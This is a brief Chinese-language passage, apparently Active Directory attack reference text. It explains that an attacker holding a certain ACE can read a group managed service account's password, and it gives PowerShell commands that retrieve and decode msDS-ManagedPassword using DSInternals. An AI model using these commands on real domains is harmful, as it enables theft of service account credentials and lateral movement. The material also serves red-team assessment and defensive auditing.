	攻击者可以读取此 ACE 应用到的帐户的 GMSA 密码。这可以通过 Active Directory 和 DSInternals PowerShell 模块来实现。

	$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
	$mp = $gmsa.'msDS-ManagedPassword'

	解密
	ConvertFrom-ADManagedPasswordBlob $mp